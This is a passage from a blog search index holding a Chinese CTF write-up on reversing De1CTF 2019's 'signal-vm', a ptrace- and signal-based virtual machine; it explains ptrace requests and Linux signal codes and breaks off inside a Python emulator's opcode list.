<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>De1CTF 2019 (二)</title>
    <link href="/2024/01/21/De1CTF%202019%202/"/>
    <url>/2024/01/21/De1CTF%202019%202/</url>
    
    <content type="html"><![CDATA[<p>signal-vm signal-vm-delta</p><span id="more"></span><p>虽然同属于2019年的De1CTF，但是这两道题却能学到很多东西并且都是vm类型，值得再开一篇细细的记录一下。</p><h2 id="signal-vm"><a href="#signal-vm" class="headerlink" title="signal-vm"></a>signal-vm</h2><h3 id="整体分析"><a href="#整体分析" class="headerlink" title="整体分析"></a>整体分析</h3><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2022.12.39.png"></p><p>题目的整体逻辑比较简单，输入，然后fork一个子进程，子进程执行<code>loc_40a4ca</code>函数，父进程执行<code>sub_400b60</code>函数。</p><p>先跟去子进程函数看看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2022.16.51.png"></p><p>发现一大堆非法指令，在一大堆非法指令上面调用了一个<code>ptrace</code>函数，并且参数是<code>0,0,0,0</code>即相当于<code>ptrace(PTRACE_TRACEME，0，0，0)</code>，也就是子进程希望有一个父进程来调试自己。</p><p>那么跳去父进程的函数<code>sub_400B6D</code>看看，果然也调用了<code>ptrace</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2022.19.11.png"></p><h3 id="PTRACE函数"><a href="#PTRACE函数" class="headerlink" title="PTRACE函数"></a>PTRACE函数</h3><p>再继续往下之前，需要先了解PTRACE函数，<code>ptrace()</code>系统调用能提供追踪进程执行状态的功能。<code>ptrace()</code>系统调用为一个进程提供了<strong>观察</strong>和<strong>控制</strong>另一个进程的执行过程的能力，同时也提供<strong>检查</strong>和<strong>改变</strong>另一个进程的内存值以及相关注册信息。其中，被控制的进程被称为tracee，控制进程被称为tracer</p><p>该函数签名如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span>;<br></code></pre></td></tr></table></figure><blockquote><p>request：   要执行的操作类型；<br>pid：  被追踪的目标进程ID；<br>addr：被监控的目标内存地址；<br>data：保存读取出或者要写入的数据。</p></blockquote><p>通过<code>ptrace</code>系统调用可以让一个进程进入<code>Traced</code>状态，让一个进程进入<code>Traced</code>状态可以通过两种方式：</p><ul><li><code>tracee</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_TRACEME</code>这个值，表示想要被<code>tracer</code>进程追踪。通过这种方式的进程想要进入<code>Traced</code>状态有两种方式：<ul><li>主动调用<code>exec</code>系列的系统调用；</li><li><code>tracer</code>发送进入<code>Traced</code>状态的相关信号。</li></ul></li><li><code>tracer</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_ATTACH</code>这个值，并给出<code>tracee</code>进程的<code>pid</code>，从而让<code>tracee</code>进程进入<code>Traced</code>状态。</li></ul><p>在这道题目中，父进程采取<code>tracer发送进入Traced</code>状态的相关信号的方式来调试子进程。</p><p><code>ptrace</code>函数中第一个枚举类型的参数也值得说道，一般有如下取值</p><table><thead><tr><th>enum</th><th>func</th><th>example</th></tr></thead><tbody><tr><td>PTRACE_TRACEME</td><td>子进程唯一使用，表示希望得到父进程的调试，可用于反调试</td><td>ptrace(PTRACE_TRACEME, i_pid, NULL, NULL)|</td></tr><tr><td>PTRACE_PEEKTEXT</td><td>父进程读出子进程内存中的一个字节数据，子进程由pid给出，地址由addr给出</td><td>data &#x3D; ptrace(PTRACE_PEEKTEXT, i_pid, addr,NULL)</td></tr><tr><td>PTRACE_PEEKDATA</td><td>同上</td><td>同上</td></tr><tr><td>PTRACE_POKETEXT</td><td>父进程写入子进程内存中的一个字节数据，子进程由pid给出，地址由addr给出，数据由data给出</td><td>ptrace(PTRACE_POKETEXT, i_pid, addr, data)</td></tr><tr><td>PTRACE_POKEDATA</td><td>同上</td><td>同上</td></tr><tr><td>PTRACE_PEEKUSR</td><td>父进程从子进程的user字段读出一个字节，偏移量为addr，user字段是一个user_regs_struct结构体</td><td>orig_rax &#x3D; ptrace(PTRACE_PEEKUSER, pid, 8 * ORIG_RAX, NULL)</td></tr><tr><td>PTRACE_POKEUSR</td><td>父进程向子进程的user字段写入一个字节，偏移量为addr，数据为data，user字段是一个user_regs_struct结构体</td><td>ptrace(PTRACE_PEEKUSER, pid, 8 * ORIG_RAX, data)</td></tr><tr><td>PTRACE_CONT</td><td>父进程向子进程发送继续运行信号，当<code>data</code>参数不为零时，<code>data</code>将会被解释为一个<code>signal</code>（信号），传递给被跟踪进程</td><td>ptrace(PTRACE_CONT, pid, 0, 0)</td></tr><tr><td>PTRACE_SYSCALL</td><td>同上</td><td>同上</td></tr><tr><td>PTRACE_KILL</td><td>父进程杀死子进程</td><td>ptrace(PTRACE_KILL, pid, 0, 0)</td></tr><tr><td>PTRACE_ATTACH</td><td>尝试附加到<code>pid</code>指定的进程上。附加成功后，目标进程将处于挂起状态。子进程进程会发送<code>SIGSTOP</code>信号，父进程需要调用waitpid(2)以接收此信号</td><td>ptrace(PTRACE_ATTACH, pid, NULL, NULL)</td></tr><tr><td>PTRACE_GETREGS</td><td>父进程读出子进程寄存器数据，存放至data处，是一个struct user_regs_struct结构体</td><td>ptrace(PTRACE_GETREGS, pid, 0, regs)</td></tr><tr><td>PTRACE_SETREGS</td><td>父进程写入子进程寄存器数据，数据由data提供，是一个struct user_regs_struct结构体</td><td>ptrace(PTRACE_GETREGS, pid, 0, regs)</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span></span><br><span class="hljs-class">&#123;</span><br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r15;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r14;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r13;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r12;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rbp;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rbx;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r11;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r10;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r9;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> r8;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rax;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rcx;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rdx;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rsi;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rdi;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> orig_rax;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rip;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> cs;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> eflags;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> rsp;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> ss;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> fs_base;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> gs_base;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> ds;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> es;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> fs;<br>  __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> gs;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span>   <span class="hljs-title">regs</span>;</span><br>  <span class="hljs-comment">// other fields</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而本题就基于<code>ptrace</code>函数实现了一个vm，具体流程如下：</p><ol><li><p>子进程调用<code>ptrace(PTRACE_TRACEME,0,0,0)</code>函数表示希望被调试</p></li><li><p>子进程执行非法指令，发出信号</p></li><li><p>父进程调用<code>wait</code>函数截获子进程的异常信号，wait()函数的参数是子进程的返回状态,第一个字节如果是0x7f则表示子进程异常返回，第二个字节是返回值，eg: exit(2)则第二个字节为02，子进程出现异常的时候第二个字节是linux的异常信号码。同时调用<code>ptrace</code>函数得到子进程的寄存器中<code>rip</code>的值（user_regs_struct结构体的第16位就是rip）</p><p>如下则是所有的异常码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">SIGHUP       <span class="hljs-number">1</span>          <span class="hljs-comment">/* Hangup (POSIX).  */</span>                          终止进程     终端线路挂断<br>SIGINT       <span class="hljs-number">2</span>          <span class="hljs-comment">/* Interrupt (ANSI).  */</span>                        终止进程     中断进程 Ctrl+C<br>SIGQUIT      <span class="hljs-number">3</span>          <span class="hljs-comment">/* Quit (POSIX).  */</span>                            建立CORE文件终止进程，并且生成core文件 Ctrl+\<br>SIGILL       <span class="hljs-number">4</span>          <span class="hljs-comment">/* Illegal instruction (ANSI).  */</span>              建立CORE文件,非法指令<br>SIGTRAP      <span class="hljs-number">5</span>          <span class="hljs-comment">/* Trace trap (POSIX).  */</span>                      建立CORE文件,跟踪自陷<br>SIGABRT      <span class="hljs-number">6</span>          <span class="hljs-comment">/* Abort (ANSI).  */</span><br>SIGIOT       <span class="hljs-number">6</span>          <span class="hljs-comment">/* IOT trap (4.2 BSD).  */</span>                      建立CORE文件,执行I/O自陷<br>SIGBUS       <span class="hljs-number">7</span>          <span class="hljs-comment">/* BUS error (4.2 BSD).  */</span>                     建立CORE文件,总线错误<br>SIGFPE       <span class="hljs-number">8</span>          <span class="hljs-comment">/* Floating-point exception (ANSI).  */</span>         建立CORE文件,浮点异常<br>SIGKILL      <span class="hljs-number">9</span>          <span class="hljs-comment">/* Kill, unblockable (POSIX).  */</span>               终止进程     杀死进程<br>SIGUSR1      <span class="hljs-number">10</span>         <span class="hljs-comment">/* User-defined signal 1 (POSIX).  */</span>           终止进程     用户定义信号<span class="hljs-number">1</span><br>SIGSEGV      <span class="hljs-number">11</span>         <span class="hljs-comment">/* Segmentation violation (ANSI).  */</span>           建立CORE文件,段非法错误<br>SIGUSR2      <span class="hljs-number">12</span>         <span class="hljs-comment">/* User-defined signal 2 (POSIX).  */</span>           终止进程     用户定义信号<span class="hljs-number">2</span><br>SIGPIPE      <span class="hljs-number">13</span>         <span class="hljs-comment">/* Broken pipe (POSIX).  */</span>                     终止进程     向一个没有读进程的管道写数据<br>SIGALARM     <span class="hljs-number">14</span>         <span class="hljs-comment">/* Alarm clock (POSIX).  */</span>                     终止进程     计时器到时<br>SIGTERM      <span class="hljs-number">15</span>         <span class="hljs-comment">/* Termination (ANSI).  */</span>                      终止进程     软件终止信号<br>SIGSTKFLT    <span class="hljs-number">16</span>         <span class="hljs-comment">/* Stack fault.  */</span><br>SIGCLD       SIGCHLD    <span class="hljs-comment">/* Same as SIGCHLD (System V).  */</span><br>SIGCHLD      <span class="hljs-number">17</span>         <span class="hljs-comment">/* Child status has changed (POSIX).  */</span>        忽略信号     当子进程停止或退出时通知父进程<br>SIGCONT      <span class="hljs-number">18</span>         <span class="hljs-comment">/* Continue (POSIX).  */</span>                        忽略信号     继续执行一个停止的进程<br>SIGSTOP      <span class="hljs-number">19</span>         <span class="hljs-comment">/* Stop, unblockable (POSIX).  */</span>               停止进程     非终端来的停止信号<br>SIGTSTP      <span class="hljs-number">20</span>         <span class="hljs-comment">/* Keyboard stop (POSIX).  */</span>                   停止进程     终端来的停止信号 Ctrl+Z<br>SIGTTIN      <span class="hljs-number">21</span>         <span class="hljs-comment">/* Background read from tty (POSIX).  */</span>        停止进程     后台进程读终端<br>SIGTTOU      <span class="hljs-number">22</span>         <span class="hljs-comment">/* Background write to tty (POSIX).  */</span>         停止进程     后台进程写终端<br>SIGURG       <span class="hljs-number">23</span>         <span class="hljs-comment">/* Urgent condition on socket (4.2 BSD).  */</span>    忽略信号     I/O紧急信号<br>SIGXCPU      <span class="hljs-number">24</span>         <span class="hljs-comment">/* CPU limit exceeded (4.2 BSD).  */</span>            终止进程     CPU时限超时<br>SIGXFSZ      <span class="hljs-number">25</span>         <span class="hljs-comment">/* File size limit exceeded (4.2 BSD).  */</span>      终止进程     文件长度过长<br>SIGVTALRM    <span class="hljs-number">26</span>         <span class="hljs-comment">/* Virtual alarm clock (4.2 BSD).  */</span>           终止进程     虚拟计时器到时<br>SIGPROF      <span class="hljs-number">27</span>         <span class="hljs-comment">/* Profiling alarm clock (4.2 BSD).  */</span>         终止进程     统计分布图用计时器到时<br>SIGWINCH     <span class="hljs-number">28</span>         <span class="hljs-comment">/* Window size change (4.3 BSD, Sun).  */</span>       忽略信号     窗口大小发生变化<br>SIGPOLL      SIGIO      <span class="hljs-comment">/* Pollable event occurred (System V).  */</span><br>SIGIO        <span class="hljs-number">29</span>         <span class="hljs-comment">/* I/O now possible (4.2 BSD).  */</span>              忽略信号     描述符上可以进行I/O<br>SIGPWR       <span class="hljs-number">30</span>         <span class="hljs-comment">/* Power failure restart (System V).  */</span><br>SIGSYS       <span class="hljs-number">31</span>         <span class="hljs-comment">/* Bad system call.  */</span><br>SIGUNUSED    <span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>本题中只会出现四种信号分别是<code>SIGILL</code>，<code>SIGTRAP</code>，<code>SIGSEGV</code>，<code>SIGFPE</code>，父进程就会根据他们这几个信号来执行对应的操作</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2023.21.47.png"></p></li><li><p>根据截获的信号和从寄存器读出的<code>rip</code>值决定操作，同时设置<code>rip</code></p></li></ol><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2023.26.23.png" alt="截屏2024-01-21 23.26.23"></p><ol start="5"><li>将设置好的<code>rip</code>写回子进程，同时发送继续运行的信号，然后继续等待子进程的异常</li></ol><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-21%2023.21.55.png"></p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>根据以上分析可以发现，此程序父子进程之间主要是是通过<code>ptrace</code>以及异常信号进行通信，那么可以使用<code>strace</code>系统命令来进行跟踪</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2000.48.26.png"></p><p>图中红色框圈出来的就是子进程发出的信号，可以进一步提取出来</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2000.51.40.png"></p><p>只需要再重定向一下然后写个脚本把信号提取出来即可。</p><h3 id="Opcode分析"><a href="#Opcode分析" class="headerlink" title="Opcode分析"></a>Opcode分析</h3><p>有了信号，就有了对应的操作流程，那么可以尝试分析一下程序操作码是如设计的，这里选择直接将源程序打印出来，并且模拟一遍执行流程。</p><p>不过还需要注意几点</p><ol><li>输入存放的位置，经过调试发现输入存放在<code>Almost</code>字符串后50个地方，那么在模拟的时候也要相应的存入。</li><li>子进程也会执行指令，比如<code>cc</code>，这时候<code>rip</code>会自动加1，在模拟的时候也要这样做（因为rip指向的就是指令执行的地址）</li></ol><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-23%2000.59.12.png" alt="截屏2024-01-23 00.59.12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>opcode = [<span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">204</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">204</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">48</span>, <span class="hljs-number">192</span>,<br>          <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">214</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,<br>          <span class="hljs-number">48</span>, <span class="hljs-number">192</span>,<br>          <span class="hljs-number">246</span>, <span class="hljs-number">248</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">70</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">225</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>          <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span 